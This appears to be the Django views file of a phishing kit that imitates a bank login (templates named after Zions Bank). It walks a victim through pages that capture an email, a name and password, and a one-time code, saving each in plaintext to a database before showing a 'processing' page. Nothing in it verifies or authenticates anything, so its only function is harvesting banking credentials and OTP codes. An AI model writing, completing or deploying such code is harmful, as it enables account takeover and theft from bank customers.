from django.shortcuts import render
from .models import bankmail, bankdetail, otpcode
from . import models

# Create your views here.


def home(request):
    return render(request, 'bank/sign.html')

def bank(request):
    return render(request, 'bank/zions.html')

def code(request):
    return render(request, 'bank/code.html')


def process(request):
    return render(request, 'bank/pros.html')


def mail(request):
    if request.method == 'POST':
        email = request.POST['email']
        bankmail = models.bankmail.objects.create(email=email)
        bankmail.save()
        return render(request, 'bank/zions.html')


def detail(request):
    if request.method == 'POST':
        name = request.POST['name']
        password = request.POST['password']
        bankdetail = models.bankdetail.objects.create(name=name, password=password)
        bankdetail.save()
        return render(request, 'bank/code.html')


def otp(request):
    if request.method == 'POST':
        code = request.POST['code']
        coinmail = request.POST['coinmail']
        otpcode = models.otpcode.objects.create(code=code, coinmail=coinmail)
        otpcode.save()
        return render(request, 'bank/pros.html')

